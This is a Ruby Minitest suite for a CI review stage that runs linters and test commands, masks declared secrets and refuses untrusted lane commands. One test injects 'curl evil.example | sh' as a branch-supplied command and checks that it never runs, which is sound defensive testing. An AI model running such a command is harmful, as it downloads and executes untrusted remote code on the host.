# frozen_string_literal: true

require_relative "test_helpers"
require "open3"
require_relative "../scripts/review_stage1"

class ReviewStage1Test < Minitest::Test
  FIXTURES = File.expand_path("fixtures/stage1", __dir__)
  GEMFILE = File.expand_path("../Gemfile", __dir__)
  Outcome = Struct.new(:status, :exit_code, :output, :timed_out) do
    def success? = status == :pass
  end

  # Stands in for the tools a CI box may lack (node, docker). Each branch fails
  # the way the real enforcer does when it sees the fixture's violation; rubocop
  # is real, run against the fixture with this repo's bundle.
  class Tools
    attr_reader :calls

    def initialize = @calls = []

    def call(command, root, _timeout, _env = nil)
      @calls << command
      case command
      when /eslint \.|oxlint|run lint/ then eslint(root)
      when /zizmor/ then zizmor(root)
      when /rubocop/ then rubocop(command, root)
      else ok
      end
    end

    private

    def ok = Outcome.new(:pass, 0, "", false)
    def fail_with(lines) = Outcome.new(:fail, 1, lines.join("\n"), false)

    def eslint(root)
      hits = Dir.glob("#{root}/**/*.{ts,js,jsx}").flat_map do |path|
        rel = path.delete_prefix("#{root}/")
        File.readlines(path).each_with_index.filter_map do |line, i|
          "#{rel}:#{i + 1}:1: error violation" if line.match?(/: any\b|^var |\.only\(|^\s+useState\(/)
        end
      end
      hits.empty? ? ok : fail_with(hits)
    end

    def zizmor(root)
      hits = Dir.glob("#{root}/.github/workflows/*.yml").flat_map do |path|
        rel = path.delete_prefix("#{root}/")
        File.readlines(path).each_with_index.filter_map do |line, i|
          "#{rel}:#{i + 1}: template injection" if line.include?("${{ github.event")
        end
      end
      hits.empty? ? ok : fail_with(hits)
    end

    def rubocop(command, root)
      env = { "BUNDLE_GEMFILE" => GEMFILE, "RUBOCOP_CACHE_ROOT" => File.join(Dir.tmpdir, "review-stage1-rubocop-cache") }
      out, status = Open3.capture2e(env, command, chdir: root)
      Outcome.new(status.success? ? :pass : :fail, status.exitstatus, out, false)
    end
  end

  def setup = @tmp = []
  def teardown = @tmp.each { |dir| FileUtils.remove_entry(dir) }

  def run_stage1(root, tools: Tools.new, **options)
    ReviewStage1.run(root, runner: tools, **options)
  end

  def result(report, id) = report.results.find { |row| row.id == id }

  def tmpdir
    dir = Dir.mktmpdir
    @tmp << dir
    dir
  end

  def copy_fixture(name)
    dir = tmpdir
    FileUtils.cp_r(File.join(FIXTURES, name, "."), dir)
    dir
  end

  # Each migration-table row: its failing fixture fails exactly that check, with
  # a file:line finding (a native scan or the enforcer's own output).
  {
    "ts_any" => "typescript", "js_var" => "javascript", "react_hooks" => "react", "rails_find_by" => "rails",
    "ruby_long_method" => "ruby", "gha_injection" => "github_actions", "focused_test" => "js_testing",
    "vite_secret" => "vite_secret", "glyph" => "glyph"
  }.each do |fixture, check|
    define_method("test_fixture_#{fixture}_fails_#{check}") do
      # Copied out of the repo so this repo's own rubocop excludes do not apply.
      row = result(run_stage1(copy_fixture(fixture)), check)
      assert_equal "failed", row.status, "#{check}: #{row.detail} #{row.findings.inspect}"
      assert_match(/[\w.\/-]+:\d+/, row.findings.join("\n"), "findings cite file:line")
      assert_predicate row, :blocking?
    end
  end

  # An enforcer missing from a present stack blocks and names the config to add.
  def test_an_eslint_config_lacking_rules_is_unavailable_not_passed
    dir = copy_fixture("js_var")
    File.write(File.join(dir, "eslint.config.mjs"), "export default [];\n")
    row = result(run_stage1(dir), "javascript")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "no-var"
    assert_includes row.detail, "eqeqeq"
  end

  # No supported linter configured (only a dependency, or nothing) does not block.
  def test_no_linter_config_is_not_applicable
    dir = copy_fixture("js_var")
    File.delete(File.join(dir, "eslint.config.mjs"))
    tools = Tools.new
    report = run_stage1(dir, tools: tools)
    row = result(report, "javascript")
    assert_equal "not_applicable", row.status, row.detail
    refute_predicate report, :blocking?
    assert_empty tools.calls.grep(/lint/)
  end

  # oxlint runs through the repo's own lint script, per its lockfile.
  def test_oxlint_runs_the_lint_script_and_its_failures_block
    tools = Tools.new
    row = result(run_stage1(copy_fixture("oxlint"), tools: tools), "javascript")
    assert_equal "failed", row.status, row.detail
    assert_equal "pnpm run lint", row.command
    assert_match(%r{src/a\.js:1}, row.findings.join("\n"))
    assert_empty tools.calls.grep(/eslint/)
  end

  def test_oxlint_lint_script_without_a_warning_budget_gets_deny_warnings
    dir = copy_fixture("oxlint")
    File.write(File.join(dir, "package.json"), '{ "scripts": { "lint": "oxlint ." }, "devDependencies": { "oxlint": "1.0.0" } }')
    row = result(run_stage1(dir), "javascript")
    assert_equal "pnpm run lint --deny-warnings", row.command
    File.delete(File.join(dir, "pnpm-lock.yaml"))
    row = result(run_stage1(dir), "javascript")
    assert_equal "npm run lint -- --deny-warnings", row.command
  end

  def test_oxlint_without_a_lint_script_runs_oxlint_directly
    dir = copy_fixture("oxlint")
    File.write(File.join(dir, "package.json"), '{ "devDependencies": { "oxlint": "1.0.0" } }')
    File.write(File.join(dir, "src/a.js"), "export const count = 1;\n")
    row = result(run_stage1(dir), "javascript")
    assert_equal "passed", row.status, row.detail
    assert_equal "npx --no-install oxlint . --deny-warnings", row.command
  end

  def test_typescript_without_strict_is_unavailable
    dir = copy_fixture("ts_any")
    File.write(File.join(dir, "tsconfig.json"), '{ "compilerOptions": { "strict": false } }')
    row = result(run_stage1(dir), "typescript")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "strict"
  end

  def test_typescript_without_type_checked_eslint_is_unavailable
    dir = copy_fixture("ts_any")
    File.write(File.join(dir, "eslint.config.mjs"), "export default [];\n")
    assert_includes result(run_stage1(dir), "typescript").detail, "recommended-type-checked"
  end

  def test_typescript_compiles_through_yarn_pnp
    assert_includes tsc_calls(".pnp.cjs" => ""), "yarn tsc --noEmit"
  end

  def test_typescript_compiles_through_a_declared_dependency
    package = %({ "devDependencies": { "typescript": "5.6.3" } })
    assert_includes tsc_calls("package.json" => package), "npx --no-install tsc --noEmit"
  end

  def tsc_calls(files)
    dir = copy_fixture("ts_any")
    files.each { |name, body| File.write(File.join(dir, name), body) }
    tools = Tools.new
    run_stage1(dir, tools: tools)
    tools.calls
  end

  def test_react_without_hooks_plugin_is_unavailable
    dir = copy_fixture("react_hooks")
    File.write(File.join(dir, "eslint.config.mjs"), "export default [];\n")
    assert_equal "unavailable", result(run_stage1(dir), "react").status
  end

  def test_testing_dep_without_its_plugin_is_unavailable
    dir = copy_fixture("focused_test")
    File.write(File.join(dir, "eslint.config.mjs"), "export default [];\n")
    row = result(run_stage1(dir), "js_testing")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "eslint-plugin-vitest"
  end

  def test_rails_without_rubocop_rails_is_unavailable
    dir = copy_fixture("rails_find_by")
    File.write(File.join(dir, ".rubocop.yml"), "AllCops:\n  SuggestExtensions: false\n")
    row = result(run_stage1(dir), "rails")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "rubocop-rails"
  end

  def test_ruby_with_metrics_cops_disabled_is_unavailable
    dir = copy_fixture("ruby_long_method")
    File.write(File.join(dir, ".rubocop.yml"), "Metrics/MethodLength:\n  Enabled: false\n")
    row = result(run_stage1(dir), "ruby")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "Metrics/MethodLength"
  end

  def test_actions_without_docker_is_unavailable
    dir = copy_fixture("gha_injection")
    path = ENV["PATH"]
    ENV["PATH"] = dir
    row = result(run_stage1(dir), "github_actions")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "docker"
  ensure
    ENV["PATH"] = path
  end

  def test_empty_repo_is_not_applicable_everywhere_it_has_no_stack
    report = run_stage1(tmpdir)
    %w[typescript javascript react rails ruby github_actions js_testing vite_secret tests].each do |id|
      assert_equal "not_applicable", result(report, id).status, id
    end
    assert_equal "passed", result(report, "glyph").status, "the glyph check always applies"
    refute_predicate report, :blocking?
  end

  def test_a_clean_stack_passes
    dir = copy_fixture("js_var")
    File.write(File.join(dir, "src/a.js"), "export const count = 1;\n")
    assert_equal "passed", result(run_stage1(dir), "javascript").status
  end

  def test_a_timeout_blocks_and_names_command_and_limit
    dir = copy_fixture("js_var")
    slow = ->(_command, _root, _timeout) { Outcome.new(:fail, nil, "", true) }
    row = result(run_stage1(dir, tools: slow, timeout: 7), "javascript")
    assert_equal "timed_out", row.status
    assert_includes row.detail, "7s"
    assert_includes row.command, "eslint"
    assert_predicate row, :blocking?
  end

  def test_a_missing_tool_is_not_applicable
    dir = tmpdir
    write(dir, "package.json", '{ "devDependencies": { "typescript": "5.6.3" } }')
    write(dir, "tsconfig.json", '{ "compilerOptions": { "strict": true } }')
    write(dir, "src/a.ts", "export const count = 1;\n")
    absent = lambda do |command, _root, _timeout, _env = nil|
      if command.include?("tsc") then Outcome.new(:fail, 1, "npm error could not determine executable to run", false)
      else Outcome.new(:pass, 0, "", false)
      end
    end
    alone = ->(command, _root, _timeout, _env = nil) { Outcome.new(:fail, 127, "sh: #{command}: command not found", false) }
    row = result(run_stage1(dir, tools: alone), "typescript")
    assert_equal "not_applicable", row.status, row.detail
    refute_predicate row, :blocking?
    row = result(run_stage1(dir, tools: absent), "typescript")
    assert_equal "not_applicable", row.status, "npx with no tsc package is a missing tool"
  end

  def test_a_failing_test_that_prints_command_not_found_still_fails
    dir = tmpdir
    write(dir, "package.json", '{ "scripts": { "test": "vitest" } }')
    noisy = ->(_command, _root, _timeout, _env = nil) { Outcome.new(:fail, 1, "expected command not found, got another error", false) }
    row = run_stage1(dir, tools: noisy).results.find { |r| r.id.start_with?("tests") }
    assert_equal "failed", row.status, row.detail
  end

  def test_a_skipped_test_entry_lets_the_next_one_run
    dir = tmpdir
    write(dir, "Gemfile", "source 'https://rubygems.org'\n")
    write(dir, "Rakefile", "require 'rake/testtask'\nRake::TestTask.new(:test)\n")
    write(dir, "package.json", '{ "scripts": { "test": "vitest" } }')
    tools = lambda do |command, _root, _timeout, _env = nil|
      if command.include?("rake") then Outcome.new(:fail, 127, "bundle: command not found", false)
      elsif command.include?("rubocop") then Outcome.new(:pass, 0, "", false)
      else Outcome.new(:fail, 1, "1 failing test", false)
      end
    end
    rows = run_stage1(dir, tools: tools).results.select { |r| r.id.start_with?("tests") }
    assert_equal [ "failed" ], rows.map(&:status), rows.map(&:detail).inspect
  end

  def test_actions_lints_only_changed_workflows
    dir = copy_fixture("gha_injection")
    calls = []
    tools = lambda do |command, _root, _timeout, _env = nil|
      calls << command
      Outcome.new(:pass, 0, "", false)
    end
    row = result(run_stage1(dir, tools: tools, files: [ "README.md" ]), "github_actions")
    assert_equal "not_applicable", row.status
    assert_empty calls.grep(/actionlint|zizmor/)
    workflow = Dir.glob(".github/workflows/*.yml", base: dir).first
    assert_equal "passed", result(run_stage1(dir, tools: tools, files: [ workflow ]), "github_actions").status
    linted = calls.grep(/actionlint|zizmor/)
    assert_equal 2, linted.size
    assert(linted.all? { |command| command.end_with?(workflow) })
  end

  # A boot.up repo skips the lane and runs its manifest suite under the
  # default, so the default must outlast this repo's own suite (947s on the mini).
  def test_the_default_timeout_fits_a_full_suite
    assert_operator ReviewStage1::DEFAULT_TIMEOUT, :>=, 1500
  end

  def test_each_status_is_one_of_the_five
    report = run_stage1(copy_fixture("js_var"))
    assert_empty report.results.map(&:status) - ReviewStage1::STATUSES
    assert_equal %w[failed unavailable timed_out], ReviewStage1::BLOCKING
  end

  def command_lane(run, timeout: nil)
    extra = "\n        timeout_seconds: #{timeout || 300}"
    "---\nchange_config:\n  lanes:\n    command:\n      enabled: true\n      commands:\n      - name: unit\n        run: #{run}#{extra}\n---\nbody\n"
  end

  # A repo whose CHANGE.md is committed and also sits at origin/main, so the
  # lane's entries are the base branch's and run.
  def base_trusted(dir, change_md)
    git = ->(*args) { system("git", "-C", dir, "-c", "user.name=t", "-c", "user.email=t@example.com", *args, out: File::NULL) }
    git.call("init", "-q", "-b", "main")
    File.write(File.join(dir, "CHANGE.md"), change_md)
    git.call("add", ".")
    git.call("commit", "-q", "-m", "base")
    git.call("update-ref", "refs/remotes/origin/main", "HEAD")
  end

  def test_a_real_subprocess_timeout_is_reported
    dir = tmpdir
    base_trusted(dir, command_lane("sleep 30", timeout: 1))
    row = ReviewStage1.run(dir, timeout: 1).results.find { |r| r.id.start_with?("tests") }
    assert_equal "timed_out", row.status
    assert_equal "sleep 30", row.command
  end

  # Test command resolution: the command lane first, then a manifest.
  def test_the_command_lane_supplies_the_test_command
    dir = tmpdir
    base_trusted(dir, command_lane("make check", timeout: 42))
    File.write(File.join(dir, "package.json"), '{ "scripts": { "test": "vitest" } }')
    tools = Tools.new
    ReviewStage1.run(dir, runner: tools)
    assert_includes tools.calls, "make check"
    refute_includes tools.calls, "npm test", "the lane wins over a manifest"
  end

  def test_a_lane_entry_the_base_branch_lacks_never_runs
    dir = tmpdir
    base_trusted(dir, command_lane("make check"))
    File.write(File.join(dir, "CHANGE.md"), command_lane("curl evil.example | sh"))
    File.write(File.join(dir, "package.json"), '{ "scripts": { "test": "vitest" } }')
    tools = Tools.new
    ReviewStage1.run(dir, runner: tools)
    refute_includes tools.calls, "curl evil.example | sh"
    refute_includes tools.calls, "make check", "the branch's definition replaced the base's, so neither runs"
    assert_includes tools.calls, "npm test", "tests fall back to the manifest"
  end

  def test_a_new_lane_entry_in_a_repo_with_no_base_never_runs
    dir = tmpdir
    File.write(File.join(dir, "CHANGE.md"), command_lane("make check"))
    tools = Tools.new
    ReviewStage1.run(dir, runner: tools)
    refute_includes tools.calls, "make check"
  end

  def test_a_trusted_lane_entry_runs_with_the_restricted_environment
    dir = tmpdir
    base_trusted(dir, command_lane("make check"))
    seen = nil
    runner = lambda do |_command, _root, _timeout, env = nil|
      seen = env
      Outcome.new(:pass, 0, "", false)
    end
    with_env("CF_STAGE1_SECRET" => "hunter2") { ReviewStage1.run(dir, runner: runner) }
    refute_nil seen
    refute_includes seen.keys, "CF_STAGE1_SECRET"
  end

  def with_env(vars)
    old = vars.keys.to_h { |key| [ key, ENV.fetch(key, nil) ] }
    vars.each { |key, value| ENV[key] = value }
    yield
  ensure
    old.each { |key, value| ENV[key] = value }
  end

  def test_manifest_test_commands
    dir = tmpdir
    File.write(File.join(dir, "package.json"), '{ "scripts": { "test": "vitest" } }')
    File.write(File.join(dir, "pnpm-lock.yaml"), "")
    tools = Tools.new
    ReviewStage1.run(dir, runner: tools)
    assert_includes tools.calls, "pnpm test"
    File.delete(File.join(dir, "pnpm-lock.yaml"))
    tools = Tools.new
    ReviewStage1.run(dir, runner: tools)
    assert_includes tools.calls, "npm test"
  end

  def test_rake_test_when_gemfile_and_rakefile
    dir = tmpdir
    File.write(File.join(dir, "Gemfile"), "source 'https://rubygems.org'\n")
    File.write(File.join(dir, "Rakefile"), "task :test\n")
    tools = Tools.new
    ReviewStage1.run(dir, runner: tools)
    assert_includes tools.calls, "bundle exec rake test"
  end

  def test_a_package_without_a_test_script_has_no_tests_to_run
    dir = tmpdir
    File.write(File.join(dir, "package.json"), '{ "scripts": { "build": "x" } }')
    assert_equal "not_applicable", result(run_stage1(dir), "tests").status
  end

  def test_a_failing_test_suite_blocks
    dir = tmpdir
    base_trusted(dir, command_lane("make check"))
    failing = lambda do |command, _root, _timeout, _env = nil|
      command == "make check" ? Outcome.new(:fail, 2, "spec.rb:9: boom", false) : Outcome.new(:pass, 0, "", false)
    end
    report = run_stage1(dir, tools: failing)
    assert_predicate report, :blocking?
    row = result(report, "tests:unit")
    assert_equal "failed", row.status
    assert_includes row.findings, "spec.rb:9: boom"
    assert_includes report.to_text, "Stage 1 blocked"
  end

  def test_glyph_check_reads_only_added_lines_of_a_diff
    dir = tmpdir
    em = [ 0x2014 ].pack("U")
    system("git", "-C", dir, "init", "-q", "-b", "main", out: File::NULL)
    File.write(File.join(dir, "old.txt"), "old #{em} line\n")
    system("git", "-C", dir, "add", ".", out: File::NULL)
    system("git", "-C", dir, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "base", out: File::NULL)
    File.write(File.join(dir, "old.txt"), "old #{em} line\nclean line\n")
    assert_equal "passed", result(run_stage1(dir), "glyph").status, "an existing glyph is not the diff's"
    File.write(File.join(dir, "new.txt"), "fresh #{em} line\n")
    row = result(run_stage1(dir), "glyph")
    assert_equal "failed", row.status
    assert_match(/new\.txt:1:/, row.findings.first)
  end

  def test_fixture_directories_are_exempt_from_the_glyph_check
    dir = tmpdir
    FileUtils.mkdir_p(File.join(dir, "test/fixtures"))
    File.write(File.join(dir, "test/fixtures/x.txt"), "a #{[ 0x2014 ].pack('U')} b\n")
    assert_equal "passed", result(run_stage1(dir), "glyph").status
  end

  def test_the_glyph_escape_hatch_is_honored
    dir = tmpdir
    system("git", "-C", dir, "init", "-q", "-b", "main", out: File::NULL)
    File.write(File.join(dir, "new.txt"), "fresh #{[ 0x2014 ].pack('U')} line\n")
    with_env("CF_ALLOW_GLYPH" => "1") { assert_equal "passed", result(run_stage1(dir), "glyph").status }
    assert_equal "failed", result(run_stage1(dir), "glyph").status
  end

  # ESLint judged on its effective config: a rule named but switched off is missing.
  class PrintConfigTools < Tools
    def initialize(rules)
      super()
      @rules = rules
    end

    def call(command, root, timeout, env = nil)
      return Outcome.new(:pass, 0, JSON.generate("rules" => @rules), false) if command.include?("--print-config")

      super
    end
  end

  def test_a_disabled_eslint_rule_is_not_an_enforcer
    dir = copy_fixture("js_var")
    off = { "no-var" => [ "off" ], "eqeqeq" => "off", "prefer-const" => 0 }
    row = result(run_stage1(dir, tools: PrintConfigTools.new(off)), "javascript")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "no-var, eqeqeq, prefer-const"
    on = { "no-var" => [ "error" ], "eqeqeq" => [ 2, "always" ], "prefer-const" => "warn" }
    refute_equal "unavailable", result(run_stage1(dir, tools: PrintConfigTools.new(on)), "javascript").status
  end

  def secret_lane(extra_env)
    "---\nchange_config:\n  lanes:\n    command:\n      enabled: true\n      commands:\n      - name: unit\n        run: make check\n        " \
      "timeout_seconds: 60\n        env: [CF_TEST_TOKEN]\n---\nbody\n#{extra_env}"
  end

  def test_declared_secrets_are_masked_in_reported_output
    dir = tmpdir
    base_trusted(dir, secret_lane(""))
    leaking = ->(_command, _root, _timeout, _env = nil) { Outcome.new(:fail, 1, "spec.rb:3: token s3cr3t-value-123 rejected", false) }
    report = with_env("CF_TEST_TOKEN" => "s3cr3t-value-123") { ReviewStage1.run(dir, runner: leaking) }
    row = result(report, "tests:unit")
    assert_equal "failed", row.status
    refute_includes row.findings.join, "s3cr3t-value-123"
    assert_includes row.findings.join, "***CF_TEST_TOKEN***"
  end

  def test_an_unset_declared_variable_is_unavailable_not_an_empty_lane
    dir = tmpdir
    base_trusted(dir, secret_lane(""))
    report = with_env("CF_TEST_TOKEN" => nil) { ReviewStage1.run(dir, runner: Tools.new) }
    row = result(report, "tests:unit")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "CF_TEST_TOKEN"
    assert_predicate report, :blocking?
  end

  def write(dir, rel, text)
    FileUtils.mkdir_p(File.dirname(File.join(dir, rel)))
    File.write(File.join(dir, rel), text)
  end

  # This repo has TypeScript and JavaScript but never adopted ESLint, so those
  # rows must not deny its own pushes. rubocop is the real one, run in-tree.
  def test_stage1_on_this_repos_own_tree_is_not_blocked_by_missing_eslint
    root = File.expand_path("..", __dir__)
    report = ReviewStage1.run(root, runner: Tools.new, files: [])
    %w[typescript javascript react js_testing vite_secret].each do |id|
      refute_includes ReviewStage1::BLOCKING, result(report, id).status, "#{id}: #{result(report, id).detail}"
    end
    assert_equal "passed", result(report, "ruby").status, result(report, "ruby").detail
  end

  def test_a_repo_that_never_adopted_eslint_is_not_denied_for_it
    dir = tmpdir
    write(dir, "package.json", "{}")
    write(dir, "src/a.js", "var x = 1\n")
    report = run_stage1(dir)
    assert_equal "not_applicable", result(report, "javascript").status
  end

  def test_eslint_runs_with_a_zero_warning_budget
    tools = Tools.new
    run_stage1(copy_fixture("js_var"), tools: tools)
    assert(tools.calls.any? { |call| call.include?("eslint . --max-warnings 0") })
  end

  def ts_repo(files)
    dir = tmpdir
    write(dir, "package.json", "{}")
    write(dir, "eslint.config.mjs", "export default [{ rules: { '@typescript-eslint/no-floating-promises': 'error' } }]; // recommendedTypeChecked\n")
    write(dir, "src/a.ts", "export const a = 1\n")
    files.each { |rel, text| write(dir, rel, text) }
    dir
  end

  def ts_status(dir) = result(run_stage1(dir), "typescript")

  def test_tsconfig_strict_through_a_relative_extends
    dir = ts_repo("tsconfig.json" => '{ "extends": "./base.json" }', "base.json" => "{ // c\n \"compilerOptions\": { \"strict\": true, }, }")
    refute_equal "unavailable", ts_status(dir).status
  end

  def test_tsconfig_strict_through_a_package_extends
    dir = ts_repo("tsconfig.json" => '{ "extends": "@tsconfig/node20/tsconfig.json" }',
                  "node_modules/@tsconfig/node20/tsconfig.json" => '{ "compilerOptions": { "strict": true } }')
    refute_equal "unavailable", ts_status(dir).status
    write(dir, "tsconfig.json", '{ "extends": "@tsconfig/node20" }')
    refute_equal "unavailable", ts_status(dir).status, "a bare package name resolves to its tsconfig.json"
  end

  def test_a_local_strict_false_overrides_an_inherited_strict
    dir = ts_repo("tsconfig.json" => '{ "extends": "./base.json", "compilerOptions": { "strict": false } }',
                  "base.json" => '{ "compilerOptions": { "strict": true } }')
    assert_equal "unavailable", ts_status(dir).status
  end

  def test_an_extends_array_lets_the_later_base_win
    dir = ts_repo("tsconfig.json" => '{ "extends": ["./a.json", "./b.json"] }', "a.json" => '{ "compilerOptions": { "strict": false } }',
                  "b.json" => '{ "compilerOptions": { "strict": true } }')
    refute_equal "unavailable", ts_status(dir).status
  end

  def test_an_unresolvable_or_cyclic_extends_is_unavailable_with_the_reason
    dir = ts_repo("tsconfig.json" => '{ "extends": "@tsconfig/missing/tsconfig.json" }')
    row = ts_status(dir)
    assert_equal "unavailable", row.status
    assert_includes row.detail, "cannot resolve tsconfig extends"
    write(dir, "tsconfig.json", '{ "extends": "./loop.json" }')
    write(dir, "loop.json", '{ "extends": "./tsconfig.json" }')
    assert_includes ts_status(dir).detail, "cyclic"
  end

  def test_manifests_and_sources_in_fixtures_and_vendor_are_not_the_repos_stack
    dir = tmpdir
    write(dir, "Gemfile", "source 'x'\n")
    write(dir, "test/fixtures/web/package.json", '{ "dependencies": { "react": "1", "eslint": "9" } }')
    write(dir, "test/fixtures/web/a.js", "var x\n")
    report = run_stage1(dir)
    %w[react javascript].each { |id| assert_equal "not_applicable", result(report, id).status, id }
  end

  def test_the_npm_init_placeholder_test_script_is_not_a_test_suite
    dir = tmpdir
    write(dir, "package.json", '{ "scripts": { "test": "echo \"Error: no test specified\" && exit 1" } }')
    assert_equal "not_applicable", result(run_stage1(dir), "tests").status
  end

  def test_a_rakefile_that_merely_mentions_latest_has_no_rake_test
    dir = tmpdir
    write(dir, "Gemfile", "source 'x'\n")
    write(dir, "Rakefile", "task :latest_build\n")
    tools = Tools.new
    run_stage1(dir, tools: tools)
    refute_includes tools.calls, "bundle exec rake test"
  end

  def test_a_public_by_design_vite_key_is_not_a_leaked_secret
    dir = tmpdir
    write(dir, "vite.config.js", "export default {}\n")
    write(dir, "src/a.js", "const k = import.meta.env.VITE_STRIPE_PUBLISHABLE_KEY\n")
    assert_equal "passed", result(run_stage1(dir), "vite_secret").status
    write(dir, "src/b.js", "const k = import.meta.env.VITE_API_SECRET\n")
    assert_equal "failed", result(run_stage1(dir), "vite_secret").status
  end

  def test_a_repo_without_rubocop_is_not_denied_for_its_cops
    dir = tmpdir
    write(dir, "Gemfile", "source 'x'\n")
    assert_equal "not_applicable", result(run_stage1(dir), "ruby").status
  end

  def test_a_declared_variable_supplied_by_the_boot_env_file_is_not_unset
    dir = tmpdir
    boot = "change_config:\n  boot:\n    env_file: .env.test\n    target_url: http://localhost:1\n" \
           "    health_url: http://localhost:1\n    timeout_seconds: 5\n"
    base_trusted(dir, secret_lane("").sub("change_config:\n", boot))
    File.write(File.join(dir, ".env.test"), "CF_TEST_TOKEN=from-file-123\n")
    report = with_env("CF_TEST_TOKEN" => nil) { ReviewStage1.run(dir, runner: Tools.new) }
    assert_equal "passed", result(report, "tests").status, result(report, "tests").detail
  end

  def test_an_untracked_file_with_invalid_utf8_does_not_crash_the_glyph_check
    dir = tmpdir
    system("git", "-C", dir, "init", "-q", "-b", "main", out: File::NULL)
    File.binwrite(File.join(dir, "bad.txt"), "caf\xE9 #{[ 0x2014 ].pack('U')} line\n".b)
    row = result(run_stage1(dir), "glyph")
    assert_equal "failed", row.status
    assert_match(/bad\.txt:1:/, row.findings.first)
  end

  def test_the_lane_reserved_runtime_variables_reach_a_trusted_entry
    dir = tmpdir
    base_trusted(dir, command_lane("make check"))
    seen = nil
    runner = lambda do |_command, _root, _timeout, env = nil|
      seen = env
      Outcome.new(:pass, 0, "", false)
    end
    ReviewStage1.run(dir, runner: runner)
    assert_match(/\Astage1-/, seen["CF_CHANGE_RUN_ID"])
    assert_includes seen.keys, "CF_CHANGE_TARGET_URL"
    assert_includes seen.keys, "CF_CHANGE_HEALTH_URL"
  end

  # A flat config scoped to application files: the alphabetically first source
  # is a root script the config does not cover.
  class ScopedConfigTools < Tools
    def call(command, root, timeout, env = nil)
      if command.include?("--print-config")
        app = command.include?("src/")
        rules = app ? { "no-var" => "error", "eqeqeq" => "error", "prefer-const" => "error" } : {}
        return Outcome.new(:pass, 0, JSON.generate("rules" => rules), false)
      end
      super
    end
  end

  def test_eslint_rules_are_judged_on_application_sources_not_the_first_file
    dir = tmpdir
    write(dir, "package.json", '{ "devDependencies": { "eslint": "9" } }')
    write(dir, "eslint.config.mjs", "export default [];\n")
    write(dir, "a-build.js", "export default 1\n")
    write(dir, "src/app.js", "export default 2\n")
    row = result(run_stage1(dir, tools: ScopedConfigTools.new), "javascript")
    refute_equal "unavailable", row.status, row.detail
  end

  def test_a_declared_boot_up_skips_the_lane_and_falls_back_to_the_manifest
    dir = tmpdir
    boot = "change_config:\n  boot:\n    up: make up\n    target_url: http://localhost:1\n    health_url: http://localhost:1\n    timeout_seconds: 5\n"
    base_trusted(dir, command_lane("make check").sub("change_config:\n", boot))
    write(dir, "package.json", '{ "scripts": { "test": "vitest" } }')
    tools = Tools.new
    row = result(ReviewStage1.run(dir, runner: tools), "tests")
    refute_includes tools.calls, "make check"
    refute_includes tools.calls, "make up", "a hook never runs boot"
    assert_includes tools.calls, "npm test"
    assert_includes row.detail, "lanes needing boot run in cf:change instead"
    assert_includes row.detail, "info:"
  end

  def js_testing_repo
    dir = tmpdir
    write(dir, "package.json", '{ "devDependencies": { "vitest": "1", "eslint": "9" } }')
    write(dir, "eslint.config.mjs", "import vitest from '@vitest/eslint-plugin'; export default [];\n")
    write(dir, "src/a.test.js", "test('x', () => {})\n")
    dir
  end

  def test_a_testing_plugin_that_is_named_but_not_enabled_is_not_an_enforcer
    dir = js_testing_repo
    named_only = PrintConfigTools.new({ "vitest/no-focused-tests" => "off", "no-var" => "error" })
    row = result(run_stage1(dir, tools: named_only), "js_testing")
    assert_equal "unavailable", row.status
    assert_includes row.detail, "vitest"
    enabled = PrintConfigTools.new({ "vitest/no-focused-tests" => [ "error" ] })
    refute_equal "unavailable", result(run_stage1(dir, tools: enabled), "js_testing").status
  end
end
